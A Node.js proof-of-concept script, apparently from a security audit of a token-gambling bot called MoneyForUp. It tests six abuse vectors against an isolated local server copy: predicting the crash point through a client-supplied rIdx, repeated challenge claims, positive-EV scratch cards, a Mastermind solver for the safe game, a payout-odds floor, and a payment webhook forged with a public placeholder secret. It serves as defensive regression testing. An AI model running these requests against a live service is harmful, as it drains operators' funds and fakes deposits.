'use strict';
/**
 * PoC новых находок (волна после 8f4ab7f) — бьёт по ЖИВОМУ bot.js в изолированной копии.
 *
 *   A) /api/racket/* — клиент присылает rIdx, а сервер по нему вычисляет точку краха.
 *      sampleCrash() детерминирован ⇒ атакующий выбирает выгодный rIdx и забирает
 *      кэшаут с гарантией (нет риска).
 *   B) /api/claim-challenge — для type !== 'streak' нет ни кулдауна, ни идемпотентности,
 *      а amount приходит от клиента ⇒ неограниченный кран токенов.
 *   C) /api/scratch/play — EV > 0 (RTP ~139%), кран (симуляция точного алгоритма).
 *   D) /api/safe/guess — джекпот 25 000 ⬦ при цене попытки 25 ⬦ и обратной связи bulls/cows
 *      ⇒ 4-значный сейф решается за ≤9 попыток (симуляция Mastermind).
 *
 * Запуск:  node .agents/skills/security-audit/scripts/poc-new-abuse.js
 * Код возврата: 0 — все вектора закрыты, 1 — хотя бы один открыт.
 */
const { startServer, C } = require('../scripts/lib/server-harness');

// ── копия sampleCrash() из bot.js (для выбора выгодного seedIdx) ────────────
const RK = { tcap: 12, k: 0.18 };
function sampleCrash(seedIdx) {
  let r;
  if (seedIdx != null) {
    let a = (seedIdx ^ 0x6D2B79F5) >>> 0;
    a = Math.imul(a ^ (a >>> 15), a | 1);
    a ^= a + Math.imul(a ^ (a >>> 7), a | 61);
    r = ((a ^ (a >>> 14)) >>> 0) / 4294967296;
  } else { r = Math.random(); }
  if (r < 0.08) return 1.00;
  if (r < 0.14) return +(1.01 + ((r - 0.08) / 0.06) * 0.09).toFixed(2);
  if (r < 0.29) return +(1.10 + ((r - 0.14) / 0.15) * 0.20).toFixed(2);
  if (r < 0.53) return +(1.30 + ((r - 0.29) / 0.24) * 0.25).toFixed(2);
  if (r < 0.73) return +(1.55 + ((r - 0.53) / 0.20) * 0.20).toFixed(2);
  if (r < 0.79) return +(1.75 + ((r - 0.73) / 0.06) * 0.25).toFixed(2);
  if (r < 0.89) return +(2.00 + ((r - 0.79) / 0.10) * 0.30).toFixed(2);
  if (r < 0.98) return +(2.30 + ((r - 0.89) / 0.09) * 0.69).toFixed(2);
  const t0 = Math.log(3.5) / RK.k;
  const rLong = (r - 0.98) / 0.02;
  return +Math.exp(RK.k * (t0 + rLong * (RK.tcap - t0))).toFixed(2);
}

let FAILED = 0;
const ok = m => console.log('  ' + C.grn('OK  ') + m);
const bad = m => { FAILED++; console.log('  ' + C.red('FAIL') + ' ' + m); };

// ── C) Симуляция Скретч-карт (точный алгоритм из bot.js) ────────────────────
function scratchRtp(rounds = 400000) {
  const SYMBOLS = [
    { mult: 50, weight: 1 }, { mult: 20, weight: 3 }, { mult: 10, weight: 6 },
    { mult: 5, weight: 15 }, { mult: 2, weight: 35 }, { mult: 1.5, weight: 40 }
  ];
  const totalWeight = SYMBOLS.reduce((s, x) => s + x.weight, 0);
  let paid = 0;
  for (let i = 0; i < rounds; i++) {
    if (Math.random() < 0.37) {
      let roll = Math.random() * totalWeight, s = null;
      for (const sym of SYMBOLS) { if (roll < sym.weight) { s = sym; break; } roll -= sym.weight; }
      if (!s) s = SYMBOLS[SYMBOLS.length - 1];
      paid += s.mult;
    }
  }
  return paid / rounds; // на 1 ⬦ ставки (cost = bet)
}
// Mastermind-решатель: перебор с учётом обратной связи bulls+cows
function feedback(secret, guess) {
  let bulls = 0, cows = 0; const su = [0,0,0,0], gu = [0,0,0,0];
  for (let i = 0; i < 4; i++) if (guess[i] === secret[i]) { bulls++; su[i] = 1; gu[i] = 1; }
  for (let i = 0; i < 4; i++) if (!gu[i]) for (let j = 0; j < 4; j++) if (!su[j] && guess[i] === secret[j]) { cows++; su[j] = 1; break; }
  return [bulls, cows];
}
function solveRounds(secret) {
  const all = []; for (let n = 0; n <= 9999; n++) all.push(String(n).padStart(4, '0'));
  let pool = all.slice();
  const used = new Set();
  let guess = '0011';
  for (let count = 1; count <= 30; count++) {
    used.add(guess);
    const fb = feedback(secret, guess);
    if (fb[0] === 4) return count;
    const key = fb.join(',');
    pool = pool.filter(c => feedback(c, guess).join(',') === key);
    const next = pool.find(g => !used.has(g));
    if (!next) return count;
    guess = next;
  }
  return 30;
}

(async () => {
  console.log(C.b('\n=== MoneyForUp — PoC новых находок (волна после 8f4ab7f) ===\n'));

  // ── A) Ракетка: клиентский rIdx = гарантированный выигрыш ────────────────
  console.log(C.b('A) Ракетка: клиентский rIdx подменяет точку краха'));
  {
    // Ищем seedIdx с большим крахом (то, что атакующий может вычислить офлайн)
    let best = { idx: 0, crash: 0 };
    for (let i = 0; i < 200000; i++) { const c = sampleCrash(i); if (c > best.crash) best = { idx: i, crash: c }; }
    console.log('  выбран rIdx=' + best.idx + ', предсказанный крах ×' + best.crash);

    const srv = await startServer({ users: [{ id: 7001, tokens: 1000, depositedRub: 300, name: 'Poc' }] });
    try {
      const before = srv.bal(7001);
      const betRes = await srv.post('/api/racket/bet', { bet: 1000, roundId: 'RK_POC_1', rIdx: best.idx }, 7001);
      const co = await srv.post('/api/racket/cashout', { roundId: 'RK_POC_1', mult: best.crash }, 7001);
      const after = srv.bal(7001);
      console.log('  bet:', betRes.status, JSON.stringify(betRes.body));
      console.log('  cashout:', co.status, JSON.stringify(co.body));
      console.log('  баланс: ' + before + ' → ' + after);
      if (co.status === 200 && co.body && co.body.win > 0 && after > before) {
        bad('A: выигрыш получен по ЗАРАНЕЕ выбранному краху, риска нет (до +' + co.body.win + ' ⬦ за раунд)');
      } else {
        ok('A: сервер не принимает произвольный rIdx');
      }
    } finally { await srv.stop(); }
  }

  // ── B) claim-challenge: неограниченный кран ──────────────────────────────
  console.log(C.b('\nB) /api/claim-challenge: type!=streak без кулдауна и дедупликации'));
  {
    const srv = await startServer({ users: [{ id: 7002, tokens: 0, depositedRub: 0, name: 'Poc2' }] });
    try {
      const before = srv.bal(7002);
      let granted = 0, calls = 0;
      for (let i = 0; i < 12; i++) {
        const r = await srv.post('/api/claim-challenge', { type: 'quest', amount: 250, questId: 'q' + i }, 7002);
        calls++;
        if (r.status === 200 && r.body && r.body.ok) granted += r.body.amount;
        if (r.status === 429) break;
      }
      const after = srv.bal(7002);
      console.log('  вызовов: ' + calls + ', начислено: ' + granted + ' ⬦, баланс: ' + before + ' → ' + after);
      if (granted > 250) bad('B: один и тот же "квест" начисляется повторно (+' + granted + ' ⬦ без квестов)');
      else ok('B: повторная выдача закрыта');
    } finally { await srv.stop(); }
  }

  // ── C) Скретч-карты: математическое ожидание > 0 ─────────────────────────
  console.log(C.b('\nC) /api/scratch/play: RTP (симуляция точного алгоритма)'));
  {
    const rtp = scratchRtp();
    const edge = (rtp - 1) * 100;
    console.log('  RTP = ' + (rtp * 100).toFixed(2) + '% (заявлено в коде ~93.5%)');
    if (rtp > 1) bad('C: RTP > 100% — игрок в плюсе на ' + edge.toFixed(1) + '% с каждой ставки (печатает токены)');
    else ok('C: RTP < 100%');
  }

  // ── D) Сейф: джекпот 25 000 при 25 ⬦/попытка и обратной связи ────────────
  console.log(C.b('\nD) /api/safe/guess: цена решения 4-значного сейфа против джекпота'));
  {
    let total = 0, n = 300;
    for (let i = 0; i < n; i++) total += solveRounds(String(Math.floor(1000 + Math.random() * 9000)));
    const avg = total / n;
    const cost = avg * 25;
    console.log('  среднее число попыток: ' + avg.toFixed(2) + ' (цена ' + cost.toFixed(0) + ' ⬦) при джекпоте 10000–25000 ⬦');
    if (cost < 10000) bad('D: решение сейфа прибыльно в среднем (+' + (10000 - cost).toFixed(0) + ' ⬦ за цикл даже при джекпоте 10000)');
    else ok('D: сейф не прибылен');
  }

  // ── E) /api/play: нижняя граница шанса 0.0094 ломает EV при большом мультипликаторе ──
  console.log(C.b('\nE) /api/play game=safe mult=1000: пол 0.0094 при maxMult > (1-edge)/0.0094'));
  {
    // GAMES.safe: minBet=maxBet=25, maxMult=1000, edge=0.05
    const p = Math.max(0.0094, (1 - 0.05) / 1000);   // = 0.0094 (пол)
    const win = Math.floor(25 * 1000);               // 25000
    const evPerRound = p * win - 25;
    console.log('  шанс победы = ' + p + ', выплата = ' + win + ' ⬦, ставка = 25 ⬦ ⇒ EV = ' + evPerRound.toFixed(1) + ' ⬦/раунд');

    const srv = await startServer({ users: [{ id: 7003, tokens: 100000, depositedRub: 300, name: 'Poc3' }] });
    try {
      const before = srv.bal(7003);
      let wins = 0, payout = 0, rounds = 0;
      for (let i = 0; i < 1500; i++) {
        const r = await srv.post('/api/play', { game: 'safe', bet: 25, mult: 1000, roundId: 'SAFE_E_' + i }, 7003);
        rounds++;
        if (r.status === 200 && r.body && r.body.win > 0) { wins++; payout += r.body.win; }
      }
      const after = srv.bal(7003);
      const net = after - before;
      console.log('  раундов: ' + rounds + ', побед: ' + wins + ', выплата: ' + payout + ' ⬦, сальдо: ' + (net >= 0 ? '+' : '') + net + ' ⬦');
      if (net > 0) bad('E: /api/play уводит игру в плюс игроку (сальдо +' + net + ' ⬦ за ' + rounds + ' раундов)');
      else ok('E: игра с большим мультипликатором остаётся минусовой для игрока');
    } finally { await srv.stop(); }
  }

  // ── F) SMS-вебхук: секрет = публичный плейсхолдер из .env.example ─────────
  console.log(C.b('\nF) /api/payment-webhook: дефолтный секрет из публичного .env.example'));
  {
    const srv = await startServer({
      users: [{ id: 7004, tokens: 0, depositedRub: 0, name: 'Poc4' }],
      env: { PAYMENT_WEBHOOK_SECRET: 'your_super_secret_key_here' } // именно так в .env проекта
    });
    try {
      const before = srv.bal(7004);
      // 1) создаём pending-заявку на 300 ₽ (термины приняты)
      const ord = await srv.post('/api/order-sbp', { rub: 300, termsAcceptedAt: Date.now() }, 7004);
      // 2) «приходит СМС» — с публичным секретом и без всякой оплаты
      const hook = await srv.post('/api/payment-webhook',
        { secret: 'your_super_secret_key_here', text: 'Пополнение 300р', sender: '+70000000000' });
      const after = srv.bal(7004);
      console.log('  order:', ord.status, JSON.stringify(ord.body).slice(0, 120));
      console.log('  webhook:', hook.status, JSON.stringify(hook.body).slice(0, 160));
      console.log('  баланс: ' + before + ' → ' + after);
      if (after > before && hook.status === 200 && hook.body.matched_order) {
        bad('F: депозит зачислен без оплаты по публичному секрету (+' + (after - before) + ' ⬦)');
      } else {
        ok('F: вебхук не зачисляет без реального секрета');
      }
    } finally { await srv.stop(); }
  }

  console.log('\n' + (FAILED ? C.red('ИТОГ: открыто векторов — ' + FAILED) : C.grn('ИТОГ: все вектора закрыты')));
  process.exit(FAILED ? 1 : 0);
})().catch(e => { console.error(C.red('PoC упал: ' + (e && e.stack || e))); process.exit(2); });
